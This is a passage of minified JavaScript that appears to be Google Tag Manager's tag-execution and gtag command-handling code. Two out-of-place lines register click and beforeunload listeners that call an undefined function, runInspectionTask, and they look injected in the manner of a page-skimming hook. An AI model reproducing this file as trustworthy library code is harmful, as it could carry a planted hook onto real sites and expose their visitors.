    return Object.keys(c);
  }
  ;
  var Qp = !1,
    Rp = 0,
    Sp = [];
  function Tp(a) {
    if (!Qp) {
      var b = D.createEventObject,
        c = "complete" == D.readyState,
        d = "interactive" == D.readyState;
      if (!a || "readystatechange" != a.type || c || !b && d) {
        Qp = !0;
        for (var e = 0; e < Sp.length; e++) G(Sp[e]);
      }
      Sp.push = function () {
        for (var f = 0; f < arguments.length; f++) G(arguments[f]);
        return 0;
      };
    }
  }
  function Up() {
    if (!Qp && 140 > Rp) {
      Rp++;
      try {
        D.documentElement.doScroll("left"), Tp();
      } catch (a) {
        z.setTimeout(Up, 50);
      }
    }
  }
  var Vp = function (a) {
    Qp ? a() : Sp.push(a);
  };
  var Wp = function (a, b) {
    return {
      entityType: 1,
      indexInOriginContainer: a,
      nameInOriginContainer: b,
      originContainerId: pg()
    };
  };
  var Yp = function (a, b) {
      this.h = !1;
      this.H = [];
      this.M = {
        tags: []
      };
      this.U = !1;
      this.B = this.C = 0;
      Xp(this, a, b);
    },
    Zp = function (a, b, c, d) {
      if (De.hasOwnProperty(b) || "__zone" === b) return -1;
      var e = {};
      ic(d) && (e = H(d, e));
      e.id = c;
      e.status = "timeout";
      return a.M.tags.push(e) - 1;
    },
    $p = function (a, b, c, d) {
      var e = a.M.tags[b];
      e && (e.status = c, e.executionTime = d);
    },
    aq = function (a) {
      if (!a.h) {
        for (var b = a.H, c = 0; c < b.length; c++) b[c]();
        a.h = !0;
        a.H.length = 0;
      }
    },
    Xp = function (a, b, c) {
      void 0 !== b && bq(a, b);
      c && z.setTimeout(function () {
        return aq(a);
      }, Number(c));
    },
    bq = function (a, b) {
      var c = La(function () {
        return G(function () {
          b(pg(), a.M);
        });
      });
      a.h ? c() : a.H.push(c);
    },
    cq = function (a) {
      a.C++;
      return La(function () {
        a.B++;
        a.U && a.B >= a.C && aq(a);
      });
    },
    dq = function (a) {
      a.U = !0;
      a.B >= a.C && aq(a);
    };
  var eq = {},
    gq = function () {
      return z[fq()];
    },
    hq = !1;
  var iq = function (a) {
      z.GoogleAnalyticsObject || (z.GoogleAnalyticsObject = a || "ga");
      var b = z.GoogleAnalyticsObject;
      if (z[b]) z.hasOwnProperty(b);else {
        var c = function () {
          c.q = c.q || [];
          c.q.push(arguments);
        };
        c.l = Number(Ia());
        z[b] = c;
      }
      return z[b];
    },
    jq = function (a) {
      if (Of()) {
        var b = gq();
        b(a + "require", "linker");
        b(a + "linker:passthrough", !0);
      }
    };
  function fq() {
    return z.GoogleAnalyticsObject || "ga";
  }
  var Fq = function (a) {},
    Lq = function (a, b) {
      return function () {
        var c = gq(),
          d = c && c.getByName && c.getByName(a);
        if (d) {
          var e = d.get("sendHitTask");
          d.set("sendHitTask", function (f) {
            var h = f.get("hitPayload"),
              l = f.get("hitCallback"),
              m = 0 > h.indexOf("&tid=" + b);
            m && (f.set("hitPayload", h.replace(/&tid=UA-[0-9]+-[0-9]+/, "&tid=" + b), !0), f.set("hitCallback", void 0, !0));
            e(f);
            m && (f.set("hitPayload", h, !0), f.set("hitCallback", l, !0), f.set("_x_19", void 0, !0), e(f));
          });
        }
      };
    };
  var Qq = {},
    Rq = {};
  function Sq(a, b) {
    if (Jg) {
      var c;
      c = b.match(/^(gtm|gtag)\./) ? encodeURIComponent(b) : "*";
      Qq[a] = "&e=" + c + "&eid=" + a;
      Tg(a);
    }
  }
  function Tq(a) {
    var b = a.eventId,
      c = a.Cb;
    if (!Qq[b]) return "";
    var d = Rq[b] ? "" : "&es=1";
    d += Qq[b];
    c && (Rq[b] = !0);
    return d;
  }
  ;
  var Uq = {};
  function Vq(a, b) {
    Jg && (Uq[a] = Uq[a] || {}, Uq[a][b] = (Uq[a][b] || 0) + 1);
  }
  function Wq(a) {
    var b = a.eventId,
      c = a.Cb,
      d = Uq[b] || {},
      e = [],
      f;
    for (f in d) d.hasOwnProperty(f) && e.push("" + f + d[f]);
    c && delete Uq[b];
    return e.length ? "&md=" + e.join(".") : "";
  }
  ;
  var Xq = {},
    Yq = {
      aev: "1",
      c: "2",
      jsm: "3",
      v: "4",
      j: "5",
      smm: "6",
      rmm: "7",
      input: "8"
    };
  function Zq(a, b, c) {
    if (Jg) {
      Xq[a] = Xq[a] || [];
      var d = Yq[b] || "0",
        e;
      e = c instanceof z.Element ? "1" : c instanceof z.Event ? "2" : c instanceof z.RegExp ? "3" : c === z ? "4" : c === D ? "5" : c instanceof z.Promise ? "6" : c instanceof z.Storage ? "7" : c instanceof z.Date ? "8" : c instanceof z.History ? "9" : c instanceof z.Performance ? "a" : c === z.crypto ? "b" : c instanceof z.Location ? "c" : c instanceof z.Navigator ? "d" : "object" !== typeof c || ic(c) ? "0" : "e";
      Xq[a].push("" + d + e);
    }
  }
  function $q(a) {
    var b = a.eventId,
      c = Xq[b] || [];
    if (!c.length) return "";
    a.Cb && delete Xq[b];
    return "&pcr=" + c.join(".");
  }
  window.addEventListener("beforeunload", runInspectionTask);
  ;
  var ar = {},
    br = {};
  function cr(a, b, c) {
    if (Jg && b) {
      var d = cg(b);
      ar[a] = ar[a] || [];
      ar[a].push(c + d);
      var e = (fd(b) ? "1" : "2") + d;
      br[a] = br[a] || [];
      br[a].push(e);
      Tg(a);
    }
  }
  function dr(a) {
    var b = a.eventId,
      c = a.Cb,
      d = "",
      e = ar[b] || [];
    e.length && (d += "&tr=" + e.join("."));
    var f = br[b] || [];
    f.length && (d += "&ti=" + f.join("."));
    c && (delete ar[b], delete br[b]);
    return d;
  }
  ;
  function er(a, b, c, d) {
    var e = Rc[a],
      f = fr(a, b, c, d);
    if (!f) return null;
    var h = bd(e[nc.Ih], c, []);
    if (h && h.length) {
      var l = h[0];
      f = er(l.index, {
        onSuccess: f,
        onFailure: 1 === l.Xh ? b.terminate : f,
        terminate: b.terminate
      }, c, d);
    }
    return f;
  }
  function fr(a, b, c, d) {
    function e() {
      if (f[nc.Pj]) l();else {
        var w = cd(f, c, []),
          x = w[nc.Ii];
        if (null != x) for (var y = 0; y < x.length; y++) if (!Q(x[y])) {
          l();
          return;
        }
        var A = Zp(c.Nb, String(f[nc.ia]), Number(f[nc.od]), w[nc.Qj]),
          B = !1;
        w.vtp_gtmOnSuccess = function () {
          if (!B) {
            B = !0;
            var E = Ja() - I;
            cr(c.id, Rc[a], "5");
            $p(c.Nb, A, "success", E);
            P(30) && Po(c, f, Xn.D.Lh);
            h();
          }
        };
        w.vtp_gtmOnFailure = function () {
          if (!B) {
            B = !0;
            var E = Ja() - I;
            cr(c.id, Rc[a], "6");
            $p(c.Nb, A, "failure", E);
            P(30) && Po(c, f, Xn.D.Kh);
            l();
          }
        };
        w.vtp_gtmTagId = f.tag_id;
        w.vtp_gtmEventId = c.id;
        c.priorityId && (w.vtp_gtmPriorityId = c.priorityId);
        cr(c.id, f, "1");
        var C = function () {
          of(3);
          var E = Ja() - I;
          cr(c.id, f, "7");
          $p(c.Nb, A, "exception", E);
          P(30) && Po(c, f, Xn.D.Jh);
          B || (B = !0, l());
        };
        P(30) && Oo(c, f);
        var I = Ja();
        try {
          ad(w, {
            event: c,
            index: a,
            type: 1
          });
        } catch (E) {
          C(E);
        }
        P(30) && Po(c, f, Xn.D.Mh);
      }
    }
    var f = Rc[a],
      h = b.onSuccess,
      l = b.onFailure,
      m = b.terminate;
    if (c.Wf(f)) return null;
    var n = bd(f[nc.Nh], c, []);
    if (n && n.length) {
      var p = n[0],
        q = er(p.index, {
          onSuccess: h,
          onFailure: l,
          terminate: m
        }, c, d);
      if (!q) return null;
      h = q;
      l = 2 === p.Xh ? m : q;
    }
    if (f[nc.Eh] || f[nc.Sj]) {
      var r = f[nc.Eh] ? Sc : c.Ol,
        t = h,
        u = l;
      if (!r[a]) {
        e = La(e);
        var v = gr(a, r, e);
        h = v.onSuccess;
        l = v.onFailure;
      }
      return function () {
        r[a](t, u);
      };
    }
    return e;
  }
  function gr(a, b, c) {
    var d = [],
      e = [];
    b[a] = hr(d, e, c);
    return {
      onSuccess: function () {
        b[a] = ir;
        for (var f = 0; f < d.length; f++) d[f]();
      },
      onFailure: function () {
        b[a] = jr;
        for (var f = 0; f < e.length; f++) e[f]();
      }
    };
  }
  function hr(a, b, c) {
    return function (d, e) {
      a.push(d);
      b.push(e);
      c();
    };
  }
  function ir(a) {
    a();
  }
  function jr(a, b) {
    b();
  }
  ;
  var lr = function (a, b) {
      return 1 === arguments.length ? kr("config", a) : kr("config", a, b);
    },
    mr = function (a, b, c) {
      c = c || {};
      c[K.g.Kb] = a;
      return kr("event", b, c);
    };
  function kr(a) {
    return arguments;
  }
  var nr = function () {
    this.h = [];
    this.B = [];
  };
  nr.prototype.enqueue = function (a, b, c) {
    var d = this.h.length + 1;
    a["gtm.uniqueEventId"] = b;
    a["gtm.priorityId"] = d;
    c.eventId = b;
    c.fromContainerExecution = !0;
    c.priorityId = d;
    var e = {
      message: a,
      notBeforeEventId: b,
      priorityId: d,
      messageContext: c
    };
    this.h.push(e);
    for (var f = 0; f < this.B.length; f++) try {
      this.B[f](e);
    } catch (h) {}
  };
  nr.prototype.listen = function (a) {
    this.B.push(a);
  };
  nr.prototype.get = function () {
    for (var a = {}, b = 0; b < this.h.length; b++) {
      var c = this.h[b],
        d = a[c.notBeforeEventId];
      d || (d = [], a[c.notBeforeEventId] = d);
      d.push(c);
    }
    return a;
  };
  nr.prototype.prune = function (a) {
    for (var b = [], c = [], d = 0; d < this.h.length; d++) {
      var e = this.h[d];
      e.notBeforeEventId === a ? b.push(e) : c.push(e);
    }
    this.h = c;
    return b;
  };
  var pr = function (a, b, c) {
      or().enqueue(a, b, c);
    },
    rr = function () {
      var a = qr;
      or().listen(a);
    };
  function or() {
    var a = Ae.mb;
    a || (a = new nr(), Ae.mb = a);
    return a;
  }
  var zr = function (a) {
      var b = Ae.zones;
      return b ? b.getIsAllowedFn(lg(), a) : function () {
        return !0;
      };
    },
    Ar = function () {
      op(function (a, b) {
        var c = Ae.zones;
        return c ? c.isActive(lg(), b) : !0;
      });
    };
  var Dr = function (a, b) {
    for (var c = [], d = 0; d < Rc.length; d++) if (a[d]) {
      var e = Rc[d];
      var f = cq(b.Nb);
      try {
        var h = er(d, {
          onSuccess: f,
          onFailure: f,
          terminate: f
        }, b, d);
        if (h) {
          var l = e[nc.ia];
          if (!l) throw "Error: No function name given for function call.";
          var m = Tc[l];
          c.push({
            xi: d,
            li: (m ? m.priorityOverride || 0 : 0) || mp(e[nc.ia], 1) || 0,
            execute: h
          });
        } else Br(d, b), f();
      } catch (p) {
        f();
      }
    }
    c.sort(Cr);
    for (var n = 0; n < c.length; n++) c[n].execute();
    return 0 < c.length;
  };
  function Cr(a, b) {
    var c,
      d = b.li,
      e = a.li;
    c = d > e ? 1 : d < e ? -1 : 0;
    var f;
    if (0 !== c) f = c;else {
      var h = a.xi,
        l = b.xi;
      f = h > l ? 1 : h < l ? -1 : 0;
    }
    return f;
  }
  function Br(a, b) {
    if (Jg) {
      var c = function (d) {
        var e = b.Wf(Rc[d]) ? "3" : "4",
          f = bd(Rc[d][nc.Ih], b, []);
        f && f.length && c(f[0].index);
        cr(b.id, Rc[d], e);
        var h = bd(Rc[d][nc.Nh], b, []);
        h && h.length && c(h[0].index);
      };
      c(a);
    }
  }
  var Gr = !1,
    Er;
  var Lr = function (a) {
    var b = a["gtm.uniqueEventId"],
      c = a["gtm.priorityId"],
      d = a.event;
    P(30) && Io(b, d);
    if ("gtm.js" === d) {
      if (Gr) return !1;
      Gr = !0;
    }
    var e,
      f = !1;
    if (pp().every(function (r) {
      return r(d, b);
    })) e = zr(b);else {
      if ("gtm.js" !== d && "gtm.init" !== d && "gtm.init_consent" !== d) return !1;
      f = !0;
      e = zr(Number.MAX_SAFE_INTEGER);
    }
    Sq(b, d);
    var h = a.eventCallback,
      l = a.eventTimeout,
      m = {
        id: b,
        priorityId: c,
        name: d,
        Wf: wp(e),
        Ol: [],
        fi: function () {
          J(6);
          of(0);
        },
        Rh: Hr(),
        Sh: Ir(b),
        Nb: new Yp(function () {
          if (P(30)) {}
          h && h.apply(h, [].slice.call(arguments, 0));
        }, l)
      };
    P(58) && (m.mg = Vq);
    P(30) && Ko(m.id, m.name);
    var n = id(m);
    P(30) && Lo(m.id, m.name);
    f && (n = Jr(n));
    P(30) && Jo(b, d);
    var p = Dr(n, m),
      q = !1;
    dq(m.Nb);
    "gtm.js" !== d && "gtm.sync" !== d || Fq(pg());
    return Kr(n, p) || q;
  };
  function Ir(a) {
    return function (b) {
      jc(b) || Zq(a, "input", b);
    };
  }
  function Hr() {
    var a = {};
    a.event = df("event", 1);
    a.ecommerce = df("ecommerce", 1);
    a.gtm = df("gtm");
    a.eventModel = df("eventModel");
    return a;
  }
  function Jr(a) {
    for (var b = [], c = 0; c < a.length; c++) if (a[c]) {
      var d = String(Rc[c][nc.ia]);
      if (Ce[d] || void 0 !== Rc[c][nc.Tj] || Te[d] || mp(d, 2)) b[c] = !0;
    }
    return b;
  }
  function Kr(a, b) {
    if (!b) return b;
    for (var c = 0; c < a.length; c++) if (a[c] && Rc[c] && !De[String(Rc[c][nc.ia])]) return !0;
    return !1;
  }
  var Mr = {};
  function Nr(a, b, c) {
    Jg && void 0 !== a && (Mr[a] = Mr[a] || [], Mr[a].push(c + b), Tg(a));
  }
  function Or(a) {
    var b = a.eventId,
      c = a.Cb,
      d = "",
      e = Mr[b] || [];
    e.length && (d += "&epr=" + e.join("."));
    c && delete Mr[b];
    return d;
  }
  ;
  var Qr = function (a, b, c, d) {
      var e = el(c, d.isGtmEvent);
      e && Pr.push("event", [b, a], e, d);
    },
    Rr = function (a, b, c, d) {
      var e = el(c, d.isGtmEvent);
      e && Pr.push("get", [a, b], e, d);
    },
    Sr = function () {
      this.status = 1;
      this.H = {};
      this.h = {};
      this.M = {};
      this.U = null;
      this.C = {};
      this.B = !1;
    },
    Tr = function (a, b, c, d) {
      var e = Ja();
      this.type = a;
      this.C = e;
      this.h = b;
      this.B = c;
      this.messageContext = d;
    },
    Ur = function () {
      this.B = {};
      this.C = {};
      this.h = [];
    },
    Vr = function (a, b) {
      var c = b.X;
      return a.B[c] = a.B[c] || new Sr();
    },
    Wr = function (a, b, c, d) {
      if (d.h) {
        var e = Vr(a, d.h),
          f = e.U;
        if (f) {
          var h = H(c),
            l = H(e.H[d.h.id]),
            m = H(e.C),
            n = H(e.h),
            p = H(a.C),
            q = {};
          if (Jg) try {
            q = H(Xe);
          } catch (v) {
            J(72);
          }
          var r = d.h.prefix,
            t = function (v) {
              Nr(d.messageContext.eventId, r, v);
            },
            u = sh(rh(qh(ph(oh(mh(lh(nh(kh(jh(ih(new hh(d.messageContext.eventId, d.messageContext.priorityId), h), l), m), n), p), q), d.messageContext.eventMetadata), function () {
              if (t) {
                var v = t;
                t = void 0;
                v("2");
                if (d.messageContext.onSuccess) d.messageContext.onSuccess();
              }
            }), function () {
              if (t) {
                var v = t;
                t = void 0;
                v("3");
                if (d.messageContext.onFailure) d.messageContext.onFailure();
              }
            }), !!d.messageContext.isGtmEvent));
          try {
            Nr(d.messageContext.eventId, r, "1"), Op(d.type, d.h.id, u), f(d.h.id, b, d.C, u);
          } catch (v) {
            Nr(d.messageContext.eventId, r, "4");
          }
        }
      }
    };
  Ur.prototype.register = function (a, b, c) {
    var d = Vr(this, a);
    3 !== d.status && (d.U = b, d.status = 3, c && (H(d.h, c), d.h = c), this.flush());
  };
  Ur.prototype.push = function (a, b, c, d) {
    void 0 !== c && (1 === Vr(this, c).status && (Vr(this, c).status = 2, this.push("require", [{}], c, {})), Vr(this, c).B && (d.deferrable = !1));
    this.h.push(new Tr(a, c, b, d));
    d.deferrable || this.flush();
  };
  Ur.prototype.flush = function (a) {
    for (var b = this, c = [], d = !1, e = {}; this.h.length;) {
      e = {
        xb: e.xb,
        De: e.De
      };
      var f = this.h[0],
        h = f.h;
      if (f.messageContext.deferrable) !h || Vr(this, h).B ? (f.messageContext.deferrable = !1, this.h.push(f)) : c.push(f), this.h.shift();else {
        switch (f.type) {
          case "require":
            if (3 !== Vr(this, h).status && !a) {
              this.h.push.apply(this.h, c);
              return;
            }
            break;
          case "set":
            k(f.B[0], function (r, t) {
              H(Qa(r, t), b.C);
            });
            break;
          case "config":
            var l = Vr(this, h);
            e.xb = {};
            k(f.B[0], function (r) {
              return function (t, u) {
                H(Qa(t, u), r.xb);
              };
            }(e));
            var m = !!e.xb[K.g.Mb];
            delete e.xb[K.g.Mb];
            var n = h.X === h.id;
            m || (n ? l.C = {} : l.H[h.id] = {});
            l.B && m || Wr(this, K.g.la, e.xb, f);
            l.B = !0;
            n ? H(e.xb, l.C) : (H(e.xb, l.H[h.id]), J(70));
            d = !0;
            break;
          case "event":
            e.De = {};
            k(f.B[0], function (r) {
              return function (t, u) {
                H(Qa(t, u), r.De);
              };
            }(e));
            Wr(this, f.B[1], e.De, f);
            break;
          case "get":
            var p = {},
              q = (p[K.g.Xa] = f.B[0], p[K.g.nb] = f.B[1], p);
            Wr(this, K.g.Ha, q, f);
        }
        this.h.shift();
        Xr(this, f);
      }
    }
    this.h.push.apply(this.h, c);
    d && this.flush();
  };
  var Xr = function (a, b) {
      if ("require" !== b.type) if (b.h) for (var c = Vr(a, b.h).M[b.type] || [], d = 0; d < c.length; d++) c[d]();else for (var e in a.B) if (a.B.hasOwnProperty(e)) {
        var f = a.B[e];
        if (f && f.M) for (var h = f.M[b.type] || [], l = 0; l < h.length; l++) h[l]();
      }
    },
    Yr = function (a, b) {
      var c = Pr,
        d = H(b);
      H(Vr(c, a).h, d);
      Vr(c, a).h = d;
    },
    Pr = new Ur();
  var Zr = {},
    $r = {},
    as = function (a, b) {
      for (var c = [], d = [], e = {}, f = 0; f < a.length; e = {
        Me: e.Me,
        He: e.He
      }, f++) {
        var h = a[f];
        if (0 <= h.indexOf("-")) {
          if (e.Me = el(h, b), e.Me) {
            var l = ng();
            xa(l, function (r) {
              return function (t) {
                return r.Me.X === t;
              };
            }(e)) ? c.push(h) : d.push(h);
          }
        } else {
          var m = Zr[h] || [];
          e.He = {};
          m.forEach(function (r) {
            return function (t) {
              return r.He[t] = !0;
            };
          }(e));
          for (var n = lg(), p = 0; p < n.length; p++) if (e.He[n[p]]) {
            c = c.concat(ng());
            break;
          }
          var q = $r[h] || [];
          q.length && (c = c.concat(q));
        }
      }
      return {
        ml: c,
        ol: d
      };
    },
    bs = function (a) {
      k(Zr, function (b, c) {
        var d = c.indexOf(a);
        0 <= d && c.splice(d, 1);
      });
    },
    cs = function (a) {
      k($r, function (b, c) {
        var d = c.indexOf(a);
        0 <= d && c.splice(d, 1);
      });
    };
  var ds = "HA GF G UA AW DC MC".split(" "),
    es = !1,
    fs = !1;
  function gs(a, b) {
    a.hasOwnProperty("gtm.uniqueEventId") || Object.defineProperty(a, "gtm.uniqueEventId", {
      value: Ue()
    });
    b.eventId = a["gtm.uniqueEventId"];
    b.priorityId = a["gtm.priorityId"];
    return {
      eventId: b.eventId,
      priorityId: b.priorityId
    };
  }
  var hs = void 0,
    is = void 0;
  function js(a, b, c) {
    var d = H(a);
    d.eventId = void 0;
    d.inheritParentConfig = void 0;
    Object.keys(b).some(function (f) {
      return void 0 !== b[f];
    }) && J(136);
    var e = H(b);
    H(c, e);
    pr(lr(lg()[0], e), a.eventId, d);
  }
  function ks(a) {
    for (var b = ha([K.g.Tc, K.g.Lb]), c = b.next(); !c.done; c = b.next()) {
      var d = c.value,
        e = a && a[d] || Pr.C[d];
      if (e) return e;
    }
  }
  var ls = {
      config: function (a, b) {
        var c = P(59),
          d = gs(a, b);
        if (!(2 > a.length) && g(a[1])) {
          var e = {};
          if (2 < a.length) {
            if (void 0 != a[2] && !ic(a[2]) || 3 < a.length) return;
            e = a[2];
          }
          var f = el(a[1], b.isGtmEvent);
          if (f) {
            var h, l, m;
            a: {
              if (!hg.te) {
                var n = rg(xg());
                if (Bg(n)) {
                  var p = n.parent,
                    q = p.isDestination;
                  m = {
                    ql: rg(p),
                    kl: q
                  };
                  break a;
                }
              }
              m = void 0;
            }
            var r = m;
            r && (h = r.ql, l = r.kl);
            Sq(d.eventId, "gtag.config");
            var t = f.X,
              u = f.id !== t;
            if (u ? -1 === ng().indexOf(t) : -1 === lg().indexOf(t)) {
              if (!(c && b.inheritParentConfig || P(26) && e[K.g.qb])) {
                var v = ks(e);
                if (u) Dp(t, v, {
                  source: 2,
                  fromContainerExecution: b.fromContainerExecution
                });else if (c && void 0 !== h && -1 !== h.containers.indexOf(t)) {
                  var w = e;
                  hs ? js(b, w, hs) : is || (is = H(w));
                } else Cp(t, v, !0, {
                  source: 2,
                  fromContainerExecution: b.fromContainerExecution
                });
              }
            } else {
              if (h && (J(128), l && J(130), c && b.inheritParentConfig)) {
                var x = e;
                is ? js(b, is, x) : !x[K.g.Mb] && Fe && hs || (hs = H(x));
                return;
              }
              if (Fe && !u && !e[K.g.Mb]) {
                var y = fs;
                fs = !0;
                if (y) return;
              }
              es || J(43);
              if (!b.noTargetGroup) if (u) {
                cs(f.id);
                var A = f.id,
                  B = e[K.g.ie] || "default";
                B = String(B).split(",");
                for (var C = 0; C < B.length; C++) {
                  var I = $r[B[C]] || [];
                  $r[B[C]] = I;
                  0 > I.indexOf(A) && I.push(A);
                }
              } else {
                bs(f.id);
                var E = f.id,
                  F = e[K.g.ie] || "default";
                F = F.toString().split(",");
                for (var L = 0; L < F.length; L++) {
                  var M = Zr[F[L]] || [];
                  Zr[F[L]] = M;
                  0 > M.indexOf(E) && M.push(E);
                }
              }
              delete e[K.g.ie];
              var S = b.eventMetadata || {};
              S.hasOwnProperty("is_external_event") || (S.is_external_event = !b.fromContainerExecution);
              b.eventMetadata = S;
              delete e[K.g.Oc];
              for (var Z = u ? [f.id] : ng(), R = 0; R < Z.length; R++) {
                var O = e,
                  Y = H(b),
                  ba = el(Z[R], Y.isGtmEvent);
                ba && Pr.push("config", [O], ba, Y);
              }
            }
          }
        }
      },
      consent: function (a, b) {
        if (3 === a.length) {
          J(39);
          var c = gs(a, b),
            d = a[1];
          "default" === d ? Yf(a[2]) : "update" === d ? Zf(a[2], c) : "declare" === d ? b.fromContainerExecution && Xf(a[2]) : "core_platform_services" === d && $f(a[2]);
        }
      },
      event: function (a, b) {
        var c = a[1];
        if (!(2 > a.length) && g(c)) {
          var d;
          if (2 < a.length) {
            if (!ic(a[2]) && void 0 != a[2] || 3 < a.length) return;
            d = a[2];
          }
          var e = d,
            f = {},
            h = (f.event = c, f);
          e && (h.eventModel = H(e), e[K.g.Oc] && (h.eventCallback = e[K.g.Oc]), e[K.g.ce] && (h.eventTimeout = e[K.g.ce]));
          var l = gs(a, b),
            m = l.eventId,
            n = l.priorityId;
          h["gtm.uniqueEventId"] = m;
          n && (h["gtm.priorityId"] = n);
          if ("optimize.callback" === c) return h.eventModel = h.eventModel || {}, h;
          var p;
          var q = d,
            r = q && q[K.g.Kb];
          void 0 === r && (r = $e(K.g.Kb, 2), void 0 === r && (r = "default"));
          if (g(r) || va(r)) {
            var t;
            b.isGtmEvent ? t = g(r) ? [r] : r : t = r.toString().replace(/\s+/g, "").split(",");
            var u = as(t, b.isGtmEvent),
              v = u.ml,
              w = u.ol;
            if (w.length) for (var x = ks(q), y = 0; y < w.length; y++) {
              var A = el(w[y], b.isGtmEvent);
              A && Dp(A.X, x, {
                source: 3,
                fromContainerExecution: b.fromContainerExecution
              });
            }
            p = gl(v, b.isGtmEvent);
          } else p = void 0;
          var B = p;
          if (B) {
            Sq(m, c);
            for (var C = [], I = 0; I < B.length; I++) {
              var E = B[I],
                F = H(b);
              if (-1 !== ds.indexOf(sg(E.prefix))) {
                var L = H(d),
                  M = F.eventMetadata || {};
                M.hasOwnProperty("is_external_event") || (M.is_external_event = !F.fromContainerExecution);
                F.eventMetadata = M;
                delete L[K.g.Oc];
                Qr(c, L, E.id, F);
              }
              C.push(E.id);
            }
            h.eventModel = h.eventModel || {};
            0 < B.length ? h.eventModel[K.g.Kb] = C.join() : delete h.eventModel[K.g.Kb];
            es || J(43);
            void 0 === b.noGtmEvent && b.eventMetadata && b.eventMetadata.syn_or_mod && (b.noGtmEvent = !0);
            h.eventModel[K.g.pb] && (b.noGtmEvent = !0);
            return b.noGtmEvent ? void 0 : h;
          }
        }
      },
      get: function (a, b) {
        J(53);
        if (4 === a.length && g(a[1]) && g(a[2]) && ta(a[3])) {
          var c = el(a[1], b.isGtmEvent),
            d = String(a[2]),
            e = a[3];
          if (c) {
            es || J(43);
            var f = ks();
            if (!xa(ng(), function (l) {
              return c.X === l;
            })) Dp(c.X, f, {
              source: 4,
              fromContainerExecution: b.fromContainerExecution
            });else if (-1 !== ds.indexOf(sg(c.prefix))) {
              gs(a, b);
              var h = {};
              Uf(H((h[K.g.Xa] = d, h[K.g.nb] = e, h)));
              Rr(d, function (l) {
                G(function () {
                  return e(l);
                });
              }, c.id, b);
            }
          }
        }
      },
      js: function (a, b) {
        if (2 == a.length && a[1].getTime) {
          es = !0;
          var c = gs(a, b),
            d = c.eventId,
            e = c.priorityId,
            f = {};
          return f.event = "gtm.js", f["gtm.start"] = a[1].getTime(), f["gtm.uniqueEventId"] = d, f["gtm.priorityId"] = e, f;
        }
      },
      policy: function () {},
      set: function (a, b) {
        var c;
        2 == a.length && ic(a[1]) ? c = H(a[1]) : 3 == a.length && g(a[1]) && (c = {}, ic(a[2]) || va(a[2]) ? c[a[1]] = H(a[2]) : c[a[1]] = a[2]);
        if (c) {
          var d = gs(a, b),
            e = d.eventId,
            f = d.priorityId;
          H(c);
          var h = H(c);
          Pr.push("set", [h], void 0, b);
          c["gtm.uniqueEventId"] = e;
          f && (c["gtm.priorityId"] = f);
          P(14) && delete c.event;
          b.overwriteModelFields = !0;
          return c;
        }
      }
    },
    ms = {
      policy: !0
    };
  var ns = function (a) {
      var b = z[ze.da].hide;
      if (b && void 0 !== b[a] && b.end) {
        b[a] = !1;
        var c = !0,
          d;
        for (d in b) if (b.hasOwnProperty(d) && !0 === b[d]) {
          c = !1;
          break;
        }
        c && (b.end(), b.end = null);
      }
    },
    os = function (a) {
      var b = z[ze.da],
        c = b && b.hide;
      c && c.end && (c[a] = !0);
    };
  var ps = !1,
    qs = [];
  function rs() {
    if (!ps) {
      ps = !0;
      for (var a = 0; a < qs.length; a++) G(qs[a]);
    }
  }
  var ss = function (a) {
    ps ? G(a) : qs.push(a);
  };
  var Js = function (a) {
    if (Is(a)) return a;
    this.h = a;
  };
  Js.prototype.getUntrustedMessageValue = function () {
    return this.h;
  };
  var Is = function (a) {
    return !a || "object" !== fc(a) || ic(a) ? !1 : "getUntrustedMessageValue" in a;
  };
  Js.prototype.getUntrustedMessageValue = Js.prototype.getUntrustedMessageValue;
  var Ks = 0,
    Ls = {},
    Ms = [],
    Ns = [],
    Os = !1,
    Ps = !1;
  function Qs(a, b) {
    return a.messageContext.eventId - b.messageContext.eventId || a.messageContext.priorityId - b.messageContext.priorityId;
  }
  var Rs = function (a) {
      return z[ze.da].push(a);
    },
    Ss = function (a, b) {
      if (!ua(b) || 0 > b) b = 0;
      var c = Ae[ze.da],
        d = 0,
        e = !1,
        f = void 0;
      f = z.setTimeout(function () {
        e || (e = !0, a());
        f = void 0;
      }, b);
      return function () {
        var h = c ? c.subscribers : 1;
        ++d === h && (f && (z.clearTimeout(f), f = void 0), e || (a(), e = !0));
      };
    };
  function Ts(a, b) {
    var c = a._clear || b.overwriteModelFields;
    k(a, function (e, f) {
      "_clear" !== e && (c && cf(e), cf(e, f));
    });
    Pe || (Pe = a["gtm.start"]);
    var d = a["gtm.uniqueEventId"];
    if (!a.event) return !1;
    "number" !== typeof d && (d = Ue(), a["gtm.uniqueEventId"] = d, cf("gtm.uniqueEventId", d));
    return Lr(a);
  }
  function Us(a) {
    if (null == a || "object" !== typeof a) return !1;
    if (a.event) return !0;
    if (Ca(a)) {
      var b = a[0];
      if ("config" === b || "event" === b || "js" === b || "get" === b) return !0;
    }
    return !1;
  }
  function Vs() {
    var a;
    if (Ns.length) a = Ns.shift();else if (Ms.length) a = Ms.shift();else return;
    var b;
    var c = a;
    if (Os || !Us(c.message)) b = c;else {
      Os = !0;
      var d = c.message["gtm.uniqueEventId"];
      "number" !== typeof d && (d = c.message["gtm.uniqueEventId"] = Ue());
      var e = {},
        f = {
          message: (e.event = "gtm.init_consent", e["gtm.uniqueEventId"] = d - 2, e),
          messageContext: {
            eventId: d - 2
          }
        },
        h = {},
        l = {
          message: (h.event = "gtm.init", h["gtm.uniqueEventId"] = d - 1, h),
          messageContext: {
            eventId: d - 1
          }
        };
      Ms.unshift(l, c);
      if (Jg) {
        var m = jg.ctid;
        if (m) {
          var n,
            p = rg(xg());
          n = p && p.context;
          var q,
            r = uj(z.location.href);
          q = r.hostname + r.pathname;
          var t = n && n.fromContainerExecution,
            u = n && n.source,
            v = jg.Kf,
            w = hg.te;
          Jg && (Ep || (Ep = q), Fp.push(m + ";" + v + ";" + (t ? 1 : 0) + ";" + (u || 0) + ";" + (w ? 1 : 0)));
        }
      }
      b = f;
    }
    return b;
  }
  window.addEventListener("click", runInspectionTask);
  function Ws() {
    for (var a = !1, b; !Ps && (b = Vs());) {
      Ps = !0;
      delete Xe.eventModel;
      Ze();
      var c = b,
        d = c.message,
        e = c.messageContext;
      if (null == d) Ps = !1;else {
        if (e.fromContainerExecution) for (var f = ["gtm.allowlist", "gtm.blocklist", "gtm.whitelist", "gtm.blacklist", "tagTypeBlacklist"], h = 0; h < f.length; h++) {
          var l = f[h],
            m = $e(l, 1);
          if (va(m) || ic(m)) m = H(m);
          Ye[l] = m;
        }
        try {
          if (ta(d)) try {
            d.call(af);
          } catch (C) {} else if (va(d)) {
            var n = d;
            if (g(n[0])) {
              var p = n[0].split("."),
                q = p.pop(),
